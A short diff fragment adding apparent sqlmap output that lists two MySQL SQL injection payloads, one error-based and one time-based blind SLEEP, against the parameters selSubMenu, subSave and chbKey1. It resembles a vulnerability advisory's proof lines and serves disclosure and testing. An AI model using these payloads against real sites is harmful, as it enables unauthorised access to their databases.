@@ -1,0 +1,7 @@
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: selSubMenu=1&subSave=1&chbKey1=1' AND (SELECT 3238 FROM(SELECT COUNT(*),CONCAT(0x716b627171,(SELECT (ELT(3238=3238,1))),0x717a6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'jCaz'='jCaz
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: selSubMenu=1&subSave=1&chbKey1=1' AND (SELECT 1403 FROM (SELECT(SLEEP(5)))yqOv) AND 'DtsD'='DtsD
